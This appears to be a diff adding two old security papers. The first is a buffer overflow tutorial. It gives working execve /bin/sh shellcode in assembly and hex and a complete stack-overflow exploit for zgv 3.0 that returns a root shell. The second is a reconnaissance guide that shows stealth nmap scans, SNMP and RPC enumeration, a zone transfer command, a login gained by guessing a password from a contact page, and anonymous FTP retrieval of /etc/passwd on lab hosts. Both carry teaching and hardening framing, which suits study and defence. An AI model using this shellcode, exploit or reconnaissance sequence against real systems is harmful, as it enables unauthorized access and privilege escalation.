+case, our return address is 0x8054327. It is automatically stored on the stack
+when the function is called. This return address can be overwritten, and changed
+to point to any point in memory, if there is an overflow somewhere in the code.
+
+3. Example of an exploitable program
+
+Lets assume that we exploit a function like this:
+
+void lame (void) { char small[30]; gets (small); printf("%s\n", small); } main()
+{ lame (); return 0; }
+
+Compile and disassemble it:  # cc -ggdb blah.c -o blah /tmp/cca017401.o: In
+function `lame':  /root/blah.c:1: the `gets' function is dangerous and should
+not be used.  # gdb blah /* short explanation: gdb, the GNU debugger is used
+here to read the binary file and disassemble it (translate bytes to assembler
+code) */ (gdb) disas main Dump of assembler code for function main:  0x80484c8
+<main>: pushl %ebp 0x80484c9 <main+1>: movl %esp,%ebp 0x80484cb <main+3>: call
+0x80484a0 <lame> 0x80484d0 <main+8>: leave 0x80484d1<main+9>: ret
+
+(gdb) disas lame Dump of assembler code for function lame:  /* saving the frame
+pointer onto the stack right before the ret address */ 0x80484a0 <lame>: pushl
+%ebp 0x80484a1 <lame+1>: movl %esp,%ebp /* enlarge the stack by 0x20 or 32. our
+buffer is 30 characters, but the memory is allocated 4byte-wise (because the
+processor uses 32bit words) this is the equivalent to: char small[30]; */
+0x80484a3 <lame+3>: subl $0x20,%esp /* load a pointer to small[30] (the space on
+the stack, which is located at virtual address 0xffffffe0(%ebp)) on the stack,
+and call the gets function: gets(small); */ 0x80484a6 <lame+6>: leal
+0xffffffe0(%ebp),%eax 0x80484a9 <lame+9>: pushl %eax 0x80484aa <lame+10>: call
+0x80483ec <gets> 0x80484af <lame+15>: addl $0x4,%esp /* load the address of
+small and the address of "%s\n" string on stack and call the print function:
+printf("%s\n", small); */ 0x80484b2 <lame+18>: leal 0xffffffe0(%ebp),%eax
+0x80484b5 <lame+21>: pushl %eax 0x80484b6 <lame+22>: pushl $0x804852c 0x80484bb
+<lame+27>: call 0x80483dc <printf> 0x80484c0 <lame+32>: addl $0x8,%esp /* get
+the return address, 0x80484d0, from stack and return to that address. you don't
+see that explicitly here because it is done by the CPU as 'ret' */ 0x80484c3 :
+leave 0x80484c4 : ret End of assembler dump.
+
+3a. Overflowing the program # ./blah xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx # ./blah xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx Segmentation fault (core dumped) # gdb blah
+core (gdb) info registers eax: 0x24 36 ecx: 0x804852f 134513967 edx: 0x1 1 ebx:
+0x11a3c8 1156040 esp: 0xbffffdb8 -1073742408 ebp: 0x787878 7895160
+
+EBP is 0x787878, this means that we have written more data on the stack than the
+input buffer could handle. 0x78 is the hex representation of 'x'. The process
+had a buffer of 32 bytes maximum size. We have written more data into memory
+than allocated for user input and therefore overwritten EBP and the return
+address with 'xxxx', and the process tried to resume execution at address
+0x787878, which caused it to get a segmentation fault.
+
+3b. Changing the return address
+
+Lets try to exploit the program to return to lame() instead of return. We have
+to change return address 0x80484d0 to 0x80484cb, that is all. In memory, we
+have: 32 bytes buffer space | 4 bytes saved EBP | 4 bytes RET Here is a simple
+program to put the 4byte return address into a 1byte character buffer:  main() {
+int i=0; char buf[44]; for (i=0;i<=40;i+=4) *(long *) &buf[i] = 0x80484cb;
+puts(buf); } # ret ËËËËËËËËËËË,
+
+# (ret;cat)|./blah test ËËËËËËËËËËË,test test test
+
+Here we are, the program went through the function two times. If an overflow is
+present, the return address of functions can be changed to alter the programs
+execution thread.
+
+4. Shellcode
+
+To keep it simple, shellcode is simply assembler commands, which we write on the
+stack and then change the retun address to return to the stack. Using this
+method, we can insert code into a vulnerable process and then execute it right
+on the stack. So, lets generate insertable assembler code to run a shell. A
+common system call is execve(), which loads and runs any binary, terminating
+execution of the current process. The manpage gives us the usage: int execve
+(const char *filename, char *const argv [], char *const envp[]); Lets get the
+details of the system call from glibc2:  # gdb /lib/libc.so.6 (gdb) disas execve
+Dump of assembler code for function execve:  0x5da00 <execve&lgt;: pushl %ebx
+
+
+/* this is the actual syscall. before a program would call execve, it would push
+the arguments in reverse order on the stack: **envp, **argv, *filename */ /* put
+address of **envp into edx register */ 0x5da01 <execve+1>: movl
+0x10(%esp,1),%edx /* put address of **argv into ecx register */ 0x5da05
+<execve+5>: movl 0xc(%esp,1),%ecx /* put address of *filename into ebx register
+*/ 0x5da09 <execve+9>: movl 0x8(%esp,1),%ebx /* put 0xb in eax register; 0xb ==
+execve in the internal system call table */ 0x5da0d <execve+13>: movl $0xb,%eax
+/* give control to kernel, to execute execve instruction */ 0x5da12 <execve+18>:
+int $0x80
+
+0x5da14 <execve+20>: popl %ebx 0x5da15 <execve+21>: cmpl $0xfffff001,%eax
+0x5da1a <execve+26>: jae 0x5da1d <__syscall_error> 0x5da1c <execve+28>: ret End
+of assembler dump.
+
+4a. making the code portable
+
+We have to apply a trick to be able to make shellcode without having to
+reference the arguments in memory the conventional way, by giving their exact
+address on the memory page, which can only be done at compile time. Once we can
+estimate the size of the shellcode, we can use the instructions jmp <bytes> and
+call <bytes> to go a specified number of bytes back or forth in the execution
+thread. Why use a call? We have the opportunity that a CALL will automatically
+store the return address on the stack, the return address being the next 4 bytes
+after the CALL instruction. By placing a variable right behind the call, we
+indirectly push its address on the stack without having to know it.
+
+
+0 jmp <Z> (skip Z bytes forward) 2 popl %esi
+... put function(s) here ... 
+Z call <-Z+2> (skip 2 less than Z bytes backward, to POPL) Z+5 .string (first
+variable)
+
+(Note: If you're going to write code more complex than for spawning a simple
+shell, you can put more than one .string behind the code. You know the size of
+those strings and can therefore calculate their relative locations once you know
+where the first string is located.)
+
+4b. the shellcode
+
+
+global code_start /* we'll need this later, dont mind it */ global code_end
+.data 
+code_start:  jmp 0x17 popl %esi movl %esi,0x8(%esi) /* put address of **argv
+behind shellcode,
+
+0x8 bytes behind it so a /bin/sh has place */ xorl %eax,%eax /* put 0 in %eax */
+movb %eax,0x7(%esi) /* put terminating 0 after /bin/sh string */ movl
+%eax,0xc(%esi) /* another 0 to get the size of a long word */ my_execve:  movb
+$0xb,%al /* execve( */ movl %esi,%ebx /* "/bin/sh", */ leal 0x8(%esi),%ecx /* &
+of "/bin/sh", */ xorl %edx,%edx /* NULL */ int $0x80 /* ); */ call -0x1c
+.string "/bin/shX" /* X is overwritten by movb %eax,0x7(%esi) */ 
+code_end:
+
+(The relative offsets 0x17 and -0x1c can be gained by putting in 0x0, compiling,
+disassembling and then looking at the shell codes size.)
+
+This is already working shellcode, though very minimal. You should at least
+disassemble the exit() syscall and attach it (before the 'call'). The real art
+of making shellcode also consists of avoiding any binary zeroes in the code
+(indicates end of input/buffer very often) and modify it for example, so the
+binary code does not contain control or lower characters, which would get
+filtered out by some vulnerable programs. Most of this stuff is done by
+self-modifying code, like we had in the movb %eax,0x7(%esi) instruction. We
+replaced the X with \0, but without having a \0 in the shellcode initially...
+
+Lets test this code... save the above code as code.S (remove comments) and the
+following file as code.c:  extern void code_start(); extern void code_end();
+#include <stdio.h> main() { ((void (*)(void)) code_start)(); }
+
+# cc -o code code.S code.c # ./code bash#
+
+You can now convert the shellcode to a hex char buffer. Best way to do this is,
+print it out:  #include <stdio.h> extern void code_start(); extern void
+code_end(); main() { fprintf(stderr,"%s",code_start); }
+
+and parse it through aconv -h or bin2c.pl, those tools can be found at:
+http://www.dec.net/~dhg or http://members.tripod.com/mixtersecurity
+
+5. Writing an exploit
+
+Let us take a look at how to change the return address to point to shellcode put
+on the stack, and write a sample exploit. We will take zgv, because that is one
+of the easiest things to exploit out there :)
+
+
+# export HOME=`perl -e 'printf "a" x 2000'` # zgv Segmentation fault (core
+dumped) # gdb /usr/bin/zgv core #0 0x61616161 in ?? () (gdb) info register esp
+esp: 0xbffff574 -1073744524
+
+Well, this is the top of the stack at crash time. It is safe to presume that we
+can use this as return address to our shellcode.
+
+We will now add some NOP (no operation) instructions before our buffer, so we
+don't have to be 100% correct regarding the prediction of the exact start of our
+shellcode in memory (or even brute forcing it). The function will return onto
+the stack somewhere before our shellcode, work its way through the NOPs to the
+inital JMP command, jump to the CALL, jump back to the popl, and run our code on
+the stack.
+
+Remember, the stack looks like this: at the lowest memory address, the top of
+the stack where ESP points to, the initial variables are stored, namely the
+buffer in zgv that stores the HOME environment variable. After that, we have the
+saved EBP(4bytes) and the return address of the previous function. We must write
+8 bytes or more behind the buffer to overwrite the return address with our new
+address on the stack.
+
+The buffer in zgv is 1024 bytes big. You can find that out by glancing at the
+code, or by searching for the initial subl $0x400,%esp (=1024) in the vulnerable
+function. We will now put all those parts together in the exploit:
+
+5a. Sample zgv exploit
+
+/* zgv v3.0 exploit by Mixter buffer overflow tutorial - http://1337.tsx.org
+
+sample exploit, works for example with precompiled redhat 5.x/suse 5.x/redhat
+6.x/slackware 3.x linux binaries */
+
+#include <stdio.h> #include <unistd.h> #include <stdlib.h>
+
+/* This is the minimal shellcode from the tutorial */ static char shellcode[]=
+"\xeb\x17\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d"
+"\x4e\x08\x31\xd2\xcd\x80\xe8\xe4\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x58";
+
+#define NOP 0x90 #define LEN 1032 #define RET 0xbffff574
+
+int main() { char buffer[LEN]; long retaddr = RET; int i;
+
+fprintf(stderr,"using address 0x%lx\n",retaddr);
+
+/* this fills the whole buffer with the return address, see 3b) */ for
+(i=0;i<LEN;i+=4) *(long *)&buffer[i] = retaddr;
+
+/* this fills the initial buffer with NOP's, 100 chars less than the buffer
+size, so the shellcode and return address fits in comfortably */ for
+(i=0;i<(LEN-strlen(shellcode)-100);i++) *(buffer+i) = NOP;
+
+/* after the end of the NOPs, we copy in the execve() shellcode */
+memcpy(buffer+i,shellcode,strlen(shellcode));
+
+/* export the variable, run zgv */
+
+setenv("HOME", buffer, 1); execlp("zgv","zgv",NULL); return 0; }
+
+/* EOF */
+
+We now have a string looking like this:
+
+[ ... NOP NOP NOP NOP NOP JMP SHELLCODE CALL /bin/sh RET RET RET RET RET RET ]
+
+While zgv's stack looks like this:
+
+v-- 0xbffff574 is here [ S M A L L B U F F E R ] [SAVED EBP] [ORIGINAL RET]
+
+The execution thread of zgv is now as follows:
+
+main ... -> function() -> strcpy(smallbuffer,getenv("HOME")); At this point, zgv
+fails to do bounds checking, writes beyond smallbuffer, and the return address
+to main is overwritten with the return address on the stack. function() does
+leave/ret and the EIP points onto the stack:  0xbffff574 nop 0xbffff575 nop
+0xbffff576 nop 0xbffff577 jmp $0x24 0xbffff579 popl %esi [... shellcode starts
+here ...] 0xbffff59b call -$0x1c 0xbffff59e .string "/bin/shX"
+
+Lets test the exploit...  # cc -o zgx zgx.c # ./zgx using address 0xbffff574
+bash# 5b. further tips on writing exploits There are a lot of programs which are
+tough to exploit, but nonetheless vulnerable. However, there are a lot of tricks
+you can do to get behind filtering and such. There are also other overflow
+techniques which do not necessarily include changing the return address at all
+or only the return address. There are so-called pointer overflows, where a
+pointer that a function allocates can be overwritten by an overflow, altering
+the programs execution flow (an example is the RoTShB bind 4.9 exploit), and
+exploits where the return address points to the shells environment pointer,
+where the shellcode is located instead of being on the stack (this defeats very
+small buffers, and Non-executable stack patches, and can fool some security
+programs, though it can only be performed locally). Another important subject
+for the skilled shellcode author is radically self-modifying code, which
+initially only consists of printable, non-white upper case characters, and then
+modifies itself to put functional shellcode on the stack which it executes, etc.
+You should never, ever have any binary zeroes in your shell code, because it
+will most possibly not work if it contains any. But discussing how to sublimate
+certain assembler commands with others would go beyond the scope of this paper.
+I also suggest reading the other great overflow howto's out there, written by
+aleph1, Taeoh Oh and mudge.
+
+5c. important note
+
+You will NOT be able to use this tutorial on Windows or Macintosh. Do NOT ask me
+for cc.exe and gdb.exe either! =oP
+
+6. Conclusions
+
+We have learned, that once an overflow is present which is user dependent, it
+can be exploited about 90% of the time, even though exploiting some situations
+is difficult and takes some skill. Why is it important to write exploits?
+Because ignorance is omniscient in the software industry. There have already
+been reports of vulnerabilities due to buffer overflows in software, though the
+software has not been updated, or the majority of users didn't update, because
+the vulnerability was hard to exploit and nobody believed it created a security
+risk. Then, an exploit actually comes out, proves and practically enables a
+program to be exploitable, and there is usually a big (neccessary) hurry to
+update it.
+
+As for the programmer (you), it is a hard task to write secure programs, but it
+should be taken very serious. This is a specially large concern when writing
+servers, any type of security programs, or programs that are suid root, or
+designed to be run by root, any special accounts, or the system itself. Apply
+bounds checking (strn*, sn*, functions instead of sprintf etc.), prefer
+allocating buffers of a dynamic, input-dependent, size, be careful on
+for/while/etc. loops that gather data and stuff it into a buffer, and generally
+handle user input with very much care are the main principles I suggest.
+
+There has also been made notable effort of the security industry to prevent
+overflow problems with techniques like non-executable stack, suid wrappers,
+guard programs that check return addresses, bounds checking compilers, and so
+on. You should make use of those techniques where possible, but do not fully
+rely on them. Do not assume to be safe at all if you run a vanilla two-year old
+UNIX distribution without updates, but overflow protection or (even more stupid)
+firewalling/IDS. It cannot assure security, if you continue to use insecure
+programs because _all_ security programs are _software_ and can contain
+vulnerabilities themselves, or at least not be perfect. If you apply frequent
+updates _and_ security measures, you can still not expect to be secure, _but_
+you can hope. :-)
+
+mixter@newyorkoffice.com http://members.tripod.com/mixtersecurity
+
+
+
+===================[What You Don't Know Will Hurt You]===================
+===================[     by Larry W. Cashdollar      ]===================
+
+
+
+I. Overview
+
+   The first stage to a successful network attack is the information gathering
+stage.  The attacker will collect as much information possible on the target
+host in order to generate a vulnerability list.  Relevant to this list will be
+OS type, OS version, services, service daemon versions, network
+topology*,network equipment, firewalls, intrusion detection sensors etc..  The
+purpose of this document is to outline two models of information gathering . 
+The first model is "noisy" where the attacker uses all known resources with
+little reguard for what footprints* might be left on the target.  The second is
+"stealthy". Wherein the attacker uses methods and packages designed to subvert
+logging facilities on the target.  This approach minimizes administrator
+awareness and accountability.  I will examine a few systems, ranging from
+Solaris 2.x Sparc systems to Linux/i386 architectures. I will then discuss how
+we can harden a system to minimize information leakage.
+  
+II. Utilities and Packages
+
+    The utilities we will use can can range from some common system commands to
+network information gathering packages like nmap. I will list a few below and
+give a brief description of each.  In the resources section you will find sites
+and security indexes where search engines can dig up a myriad of network
+security tools.  These are just a few.
+  
+            System Utilities. 
+  
+Utility Description finger Displays user information or current users logged
+into specified host rusers Same as finger but in more detail showmount Displays
+directories available for mounting via NFS.  rpcinfo Makes a call to rpc server
+and displays information gathered.  dig DNS information gathering tool. Very
+useful.  whois internic database lookup program.  snmpwalk Gather network
+information using the SNMP protocol.  traceroute Show packet path to target
+host.  nslookup Convert ip address to conical and visa versa mail bounce Use a
+bogus recipient to gain information on a target host.
+
+
+            Tool packages
+  
+Tool Description netgrep Netgrep scans an ip range for one specific port.  sscan
+Scans multiple vulnerabilities and also uses host gathering techniques.  nmap
+Stealth port scanner with stack fingerprinting ability and source spoofing
+techniques, does xmas,syn,fin and UDP scans.  mscan older version of sscan,
+still kind of fun.  NSS Narrow Security scanner its a perl script which makes it
+nice and portable.  Searches for common vulnerabilities like msadc.pl and
+showcode.asp.  I found it works very well.  CIS Cerebrus internet scanner nessus
+Nessus is a security auditing program that can scan an entire class A subnet for
+multiple DoS attacks,exploits and mis-configurations.  It runs in to parts a
+client and server type application is used where all scanning functions are done
+by the server which are controlled by the client. Nessus scans for many modern
+security issues such as Windows vulnerabilities and various Unix exploits. 
+
+
+              Common services.
+
+
+Service Description SSH Secure Shell an interactive encrypted shell session like
+telnet.  NFS Network File System allow file systems to be exported across the
+network and mounted on a remote system.  rlogin/rsh/rexec Remote login / Remote
+shell / Remote execute finger Display remote user information and current users
+logged in.  FTP File transfer protocol, transfer binary and ASCII files between
+hosts.  sendmail Mail delivery system between hosts.  WWW World Wide Web a.k.a
+Hyper Text Tranport Protocol. You are looking at it now.  netbios Protocol that
+allows MS networked machines to share resources.  DNS Domain Name Service, used
+to resolve IP addresses to conical names and vise versa.  telnet Start an
+interactive shell on a remote host using the TELNET protocol.  QPOP Pop your
+email off the server to read off-line.  portmap Maps sun rpc services to their
+respective ports (UDP)
+
+
+  III. Information
+
+    Just about any information on a target host is useful in creating a database
+of applicable vulnerabilities. What we are attempting to do is determine what
+services the target offers and if any of them can be exploited to leverage
+access to the system. For example knowing the version of the OS that your target
+host is using can help you find information on exploits or bugs specific to that
+OS.  By limiting what services we are running and what information is available
+we decrease the window of opportunity for the cracker.
+
+IV. Information Gathering (Noisy)
+
+    Just about all of the utilities mentioned above will disclose information
+     about the target host. You can piece together parts of a targets network
+     topology by bouncing a bad email off of the server. This can disclose a
+     weather the mail is relayed internally on another host and the type and
+     version of software used to handle internet/exchanged mail.  Using
+     traceroute you can discover network equipment like routers and switches. 
+     Portsan will give you a list of services available on the target host. 
+     These are all common methods adopted by system crackers to gain access to
+     their target.  Their are many packages out there that automate this process
+     of poking, gathering, logging and sorting.  For example Sscan is a utility
+     for crackers and system admins to gather information on target hosts
+     machines also. It scans the host or network for various security problems
+     and checks for vulnerabilities. Nessus is another package that scans a
+     network for problems as it also checks for DoS attacks and poorly
+     configured network equipment like routers and manageable hubs.  Just
+     grabbing banners with telnet or netcat will divulge important information
+     on your target. All of this is fine, but what about more sinister methods
+     of information gathering? What about using information you meant to provide
+     being used against you?  What about the stuff your logs don't catch?
+
+V. Information Gathering (Stealth)
+
+    This method uses the common public ports and specially designed utilities to
+gather host, user and system information. When I talk about common public ports
+I am referring to ports that are expected to be accessed by the everyday
+internet user (53*, 80, 25 , 21*). These services can be queried with little or
+no suspicion of the administrator. Some ports have varying degrees of
+noticeably, for example if you do a zone transfer of the target systems dns
+records. This may set off alarms that suspicious activity is at hand, perhaps
+more so then an anonymous ftp connection depending on the site and
+administrators awareness.
+
+    These stealth utilities like nmap are designed to take advantage of the tcp
+protocol in order to circumvent logging.  This can also be combined with
+protocols that are less common like snmp. An SNMP query can yield information
+like OS type, uptime and machine name*.  Quite a few vendors enable SNMP by
+default and most administrators are unaware of the dangers. More common services
+for example anonymous ftp can be mined for information. It is amazing what one
+can find dumped in /pub on some sites, password files, old sensitive emails,
+product information, system information and user lists.  I once found a Netscape
+Enterprise Digital Certificate for the site I was auditing sitting in /pub
+waiting for its owner to pick it up*.  In cases like this attacker simply
+downloads every readable file hoping to find something interesting.
+
+    Probably the number one reason to drive system admins to place closed
+networks on to the internet is the desire to implement a web site. In some cases
+the mad dash to get a web page up shoves proper security techniques aside. The
+old saying don't put all of your eggs in one basket applies to security as well,
+anyway back to the mad dash. This usually means that the hosting company will go
+through great lengths to provide a myriad of information to the WWW community.
+This can be a bad thing however, sometimes more information is too much
+information.
+
+VI. Procedures
+
+        This is an overview of how to use each package.  For more information
+see the man pages or the package documentation.
+  
+  
+
+Package Description brscan Broadscan is very simple to use, I plan to add more
+options to it later.  The following will search the given ip range for port 80. 
+$ ./brscan 192.168.2.1 192.168.3.254 80
+ 
+smbclient List all shares on WWW, type smbclient for more information on options
+and usage.  $lab-1> smbclient -L WWW -I 192.168.2.3
+ 
+whois $ whois whitehouse.gov@whois.arin.net traceroute $ traceroute
+www.freebsd.org dig $ dig maine.edu @192.168.172.123 axfr snmpwalk Use snmpwalk
+to query the snmp server on a remote host.  This protocol is probably less
+commonly thought of as an information gathering tool.  It is a powerful one
+however.  $lab-1> snmpwalk 192.168.2.3 public system
+ 
+nss Narrow Security Scanner.  hostfiles is file containing a list of ip
+addresses that you are scanning.
+
+./scanner  hostfiles vulnerable-log
+ 
+Nessus Nessus is a security auditing program that can scan an entire class A
+subnet for multiple DoS attacks, exploits and mis-configurations.  It runs in to
+parts a client and server type application is used where all scanning functions
+are done by the server which are controlled by the client. Nessus scans for many
+modern security issues such as Windows vulnerabilities and various Unix
+exploits.  The command is as follows:  # ./nessusd & # ./nessus &
+
+must issue an xhost command on connecting host.
+ 
+rpcinfo Display information on remote procedures being offered.  $ rpcinfo -p
+hostname
+ 
+showmount Display information on remote NFS mounts.  $ showmount -e hostname
+ 
+mail bounce An attempt to gather information on a remote host by bouncing a bad
+email off of the server and examining the header information.  $ mail -s"test"
+jkhshjkd@hostname.com test message please ignore
+.  
+ 
+ 
+nmap This is a network mapping package that is capable of stealth scanning and
+OS finger printing.  I will attempt to explain these concepts to those of you
+who are unfamiliar with them.  Stealth scanning: A normal TCP connection
+consists of a 3 way hand shake in order to connect to the other host, this
+software doesn't complete that 3 way hand shake in order to hide its attempts at
+information gathering. 
+
+OS finger printing: Mangled packets are sent in different sequences at the
+target host and depending on the target hosts reaction a guess is made as to
+what that host is running for an OS based on a table of known reactions. 
+
+# ./nmap -O -sS 192.168.0.*
+ 
+ 
+sscan Sscan is a rewrite of mscan. They are vulerability scanning tools that are
+capable of scanning a large block of ip addresses searching for known
+vulnerabilities like, Qpop, IMAP, DNS, cgi-bin/phf etc.  # ./sscan -o
+192.168.3.28
+ 
+
+VII. Locking down the house Shut down all unneeded services.  Remove all
+ unwanted packages.  Web server? don't need X, GCC, Sendmail etc... Mail server?
+ don't need apache, GNOME, GCC etc...  Look through vulnerability archives like
+ packetstorm for existing exploits.  Search for your
+ OS/Software/Services/Packages etc.. Patch accordingly.  Audit your setuid
+ binaries. find / -perm -4000 > setuid-DATESTAMP store this off-line somewhere. 
+ Install tripwire but don't rely on this alone.  Watch your logs keep a close
+ eye on the system as a whole.  Mount certain partitions Read only like /usr. 
+ Under linux you can do a mount /dev/hda2 /usr remount,ro see the man page for
+ more details.  Join Email lists like CERT, CIAC,Bugtraq and lists specific to
+ your vendors.  Limit local accounts to root and a manager account.  Passwords
+ really secure passwords.  Something you can pronounce so you can remember it,
+ but with no real words. minimum of 7 characters. Rudi^b@1 -->>> Rudy Carrot bat
+ one.  Limit services, don't run tons of plugs and proxies on your firewall.  It
+ soon becomes a proxy server once you add that AOL IM Proxy, Real audio and
+ NNTP.  Use filtering either tcp wrappers or like linux and freeBSD you can use
+ ipchains and ipfw to drop unwanted packets.  try to break into your own
+ network.  BUT make sure you have permission in writing, and notify networking
+ personnel and management.  This could even cause them to secure the boxes
+ before hand.  Which will not give an accurate security assessment but at least
+ it moved you in the right direction.  Always maintain patch levels and version
+ levels of your services, like bind and sendmail.  Only allow zone transfers and
+ queries by your network and its trusted hosts (i.e. secondary DNS).  VIII.
+ Interpretation and Sorting
+
+This section is still being completed.  In this section I have examples of
+output from various packages and I will point out significant tid bits of
+information.  These are actual logs of what information I was able to find on
+some test systems.  My comments are in red.
+  
+
+# ./nmap -sT 192.168.18.6
+
+Starting nmap V. 2.3BETA5 by Fyodor (fyodor@dhp.com, www.insecure.org/nmap/)
+Interesting ports on 192.168.18.6 Port State Protocol Service 7 filtered tcp
+echo 19 filtered tcp chargen 25 open tcp smtp 111 open tcp sunrpc 800 open tcp
+mdbs_daemon 844 open tcp unknown 1030 open tcp iad1 1521 open tcp ncube-lm 2001
+open tcp dc 12345 filtered tcp NetBus 12346 filtered tcp NetBus
+
+Nmap run completed -- 1 IP address (1 host up) scanned in 13 seconds
+  
+
+Looks like a database (port 800), so why run all of these other services?  If
+you dont need them shut them down.
+  
+
+$> snmpwalk 192.168.18.6 public system
+
+Timeout: No Response from 192.168.18.6
+
+No snmp daemons running.
+  
+
+[bewhaw ~] $ rpcinfo -p 192.168.18.6
+
+   program vers proto port service 100000 3 udp 111 rpcbind 100000 2 udp 111
+    rpcbind 100000 3 tcp 111 rpcbind 100000 2 tcp 111 rpcbind 100024 1 udp 842
+    status 100024 1 tcp 844 status 100021 1 udp 2049 nlockmgr 100021 3 udp 2049
+    nlockmgr 100021 4 udp 2049 nlockmgr 391004 1 tcp 1025 391004 1 udp 1025
+    100001 1 udp 1026 rstatd 100001 2 udp 1026 rstatd 100001 3 udp 1026 rstatd
+    100008 1 udp 1027 walld 100002 1 udp 1028 rusersd 100011 1 udp 1029 rquotad
+    100012 1 udp 1030 sprayd 100026 1 udp 1031 bootparam 391011 1 tcp 1026
+    391002 1 tcp 1027 100083 1 tcp 1028 100003 2 udp 2049 nfs 100003 3 udp 2049
+    nfs 150001 1 udp 797 pcnfsd 150001 2 udp 797 pcnfsd 150001 1 tcp 800 pcnfsd
+    150001 2 tcp 800 pcnfsd
+  
+
+Hmm lets check for nfs, I dont see mountd though.
+
+[brewhaw ~] lwcashd $ showmount -e 192.168.18.6
+
+showmount: 192.168.18.6: RPC: Program not registered
+
+Nope, no exported file systems.  Fix: Again shutdown all uneeded services.
+  
+
+[muffin ~] $ telnet 192.168.18.6 25
+
+Trying 192.168.18.6...  Connected to 192.168.18.6.  Escape character is '^]'. 
+220- mail Sendmail 950413.SGI.8.6.12/950213.SGI.AUTOCF ready at Tue, 7 Dec 1999
+13:52:49 -0500 220 ESMTP spoken here vrfy root 250 Super-User <root@mail> expn
+root 250 Super-User <root@mail>
+  
+
+Hmm IRIX 6.2 I'd guess as 8.6.12 is pretty old sendmail. It also is running with
+vrfy and expn functional they can be used to guess valid user accounts.  Fix:
+Upgrade sendmail.
+
+Lets try another system, this time we will try to be sneaky.
+
+[pangea ]$ snmpwalk test-03 public system
+
+system.sysDescr.0 = Sun SNMP Agent, Ultra-Enterprise system.sysObjectID.0 = OID:
+enterprises.42.2.1.1 system.sysUpTime.0 = Timeticks: (13902714) 1 day,
+14:37:07.14 system.sysContact.0 = System administrator system.sysName.0 =
+test-03 system.sysLocation.0 = System administrators office system.sysServices.0
+= 72
+  
+
+#./nmap -sF 192.168.1.1
+  
+  
+
+This snmp call was successful, sometimes we can discover the OS version and
+patch level this way.  Fix: Disable snmp by removing the snmp daemon from your
+startup scripts.
+
+[pangea ~] lwcashd $ finger @192.168.7.21 [192.168.7.21] connect: Connection
+refused
+
+Hmm, finger is not running so we cant get a user list that way.. lets try
+another method.
+
+[pangea ~] lwcashd $ rpcinfo -p 192.168.7.21 program vers proto port service
+   100000 4 tcp 111 rpcbind 100000 3 tcp 111 rpcbind 100000 2 tcp 111 rpcbind
+   100000 4 udp 111 rpcbind 100000 3 udp 111 rpcbind 100000 2 udp 111 rpcbind
+   100002 1 udp 32770 rusersd 100002 2 udp 32770 rusersd 100021 1 udp 32776
+   nlockmgr 100021 2 udp 32776 nlockmgr 100021 3 udp 32776 nlockmgr 100021 4 udp
+   32776 nlockmgr 100021 1 tcp 32772 nlockmgr 100021 2 tcp 32772 nlockmgr 100021
+   3 tcp 32772 nlockmgr 100021 4 tcp 32772 nlockmgr 1342177279 3 tcp 35567
+   1342177279 1 tcp 35567 1342177280 3 tcp 36146 1342177280 1 tcp 36146
+
+Hmm rusers is running lets see what that gives us.
+
+[pangea ~] lwcashd $ rusers -l 192.168.7.21 www 192.168.7.21:tty0 Jan 18 11:22
+5:54 www 192.168.7.21:tty0 Jan 18 15:09 5:54
+  
+
+We now know of one login on our target www which sometimes has easy to guess
+passwords for web maintenance.
+
+    If a service is vital to your server be sure and get information on previous
+bugs and patches.  Getting the latest version isnt always the answer as new
+features might introduce new bugs its better to keep track of the latest
+modifications to the new version and upgrade accordingly.  For example if their
+are no known vulnerabilies and the latest version adds more bells and whistles
+you might want to wait a while before upgrading.  This way the software package
+has time to be poked and prodded by system administrators and security
+personnel.
+
+    Enough dry reading already lets see how much information we can gather on
+our target with these tools. Our target is a High School web server. The box is
+hosted by the school off of a state edu connection. The box is actually one of
+my lab machines that I configured in the same exact way the server I audited
+was. All of the examples in this paper will be lab machines setup to depict
+examples as I have seen them in the wild.
+
+Nmap Scan:  For usage see the tools section.
+
+[root@Diabolic nmap-2.3BETA6]# ./nmap -O -sX 192.168.15.19
+
+Starting nmap V. 2.3BETA6 by Fyodor (fyodor@dhp.com, www.insecure.org/nmap/)
+Interesting ports on dt065ndb.maine.rr.com (192.168.15.19):
+
+Port State Protocol Service 23 open tcp telnet 25 open tcp smtp 80 open tcp http
+TCP Sequence Prediction: Class=truly random Difficulty=9999999 (Good luck!)
+Remote operating system guess: Linux 2.0.35-37
+
+Nmap run completed -- 1 IP address (1 host up) scanned in 4 seconds
+
+Our target host is running a web server and telnet for remote administration.
+They probably feel that the server is somewhat secure because they have shutdown
+most of the services. The next step is to fire up a web browser and see what
+they have for site content. <screen dump?>
+
+What I am looking for is any information that will get me what accounts exist on
+the target and whom they belong to. I find to be what I consider half of the
+password file HTMLized and up for display, a contact page. I don't really know
+if the accounts on the contact page are local or alias to a mail server
+internally. I assume its all local accounts as most school admins aren't ready
+to setup a split horizon DNS with a smart relaying sendmail configuration.
+
+The contact page is generally a list of email addresses for that site of about
+ten to fifteen teachers, staff and even the webmaster. I guess that the
+principals secretary might be a good candidate for a password guessing attack
+and try the following.
+
+Trying 192.168.15.19...  Connected to 192.168.15.19.  Escape character is '^]'.
+
+Red Hat Linux release 5.2 (Apollo) Kernel 2.0.36 on an i486 login: jsmith
+Password:jsmith<enter> [jsmith@dt065ndb jsmith]$
+
+Woops, they are local accounts and poorly passworded as I suspected. As nmap
+revealed this is a linux box. Redhat 5.2 to be specific and trivial to locate an
+exploit to get root. At this stage the game is all over. With minimal
+information gathering, nmap scan and web mining we were able to gain access to
+our target. If they had mail handled elsewhere, limited local accounts to root
+and 1 admin user with good passwords this wouldn't have happened. (entries in
+hosts.allow/deny wouldn't have killed them either)
+
+More electronic dumpster diving with ftp.
+
+[pangea /tmp] $ ftp 192.168.41.29
+
+Connected to zig.internal.net.  220 zig FTP server (UNIX(r) System V Release
+4.0) ready.  Name (zig.internal.net:security): anonymous 331 Guest login ok,
+send ident as password.  Password:  230 Guest login ok, access restrictions
+apply.  ftp> cd etc 250 CWD command successful.  ftp> get passwd 200 PORT
+command successful.  150 ASCII data connection for passwd (192.168.12.2,33793)
+(523 bytes).  226 ASCII Transfer complete.  local: passwd remote: passwd 538
+bytes received in 0.0059 seconds (89 Kbytes/s)
+
